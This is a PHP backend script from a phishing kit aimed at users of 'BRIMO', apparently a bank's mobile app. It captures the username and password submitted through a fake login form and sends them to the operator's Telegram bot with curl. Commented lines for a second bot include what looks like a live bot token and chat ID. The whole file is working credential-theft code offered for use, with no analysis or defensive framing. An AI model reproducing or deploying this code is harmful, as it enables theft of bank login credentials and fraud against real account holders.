<?php 
include "telegram.php";
session_start();
$username = $_POST['username'];
$pasword = $_POST['password'];
$_SESSION['username'] = $username;
$_SESSION['pasword'] = $pasword;
$message = "
( BRIMO AKUN | NO HP | ".$nohp." )

- Username : ".$username."
- Password : ".$pasword."
----------------
 By : jieCode
 ";
 
// $id_telegram1 = '7144662040'; - delete the // if u want use 2 bot 
// $id_botTele1 = '6942278786:AAGMZybyzJYKp494_lQ58Mi7p64Aa4kNLJc'; - delete the // if u want use 2 bot
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=HTML&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
// sendMessage($id_telegram1, $message, $id_botTele1); - delete the // if u want use 2 bot
sendMessage($id_telegram, $message, $id_botTele);
?>
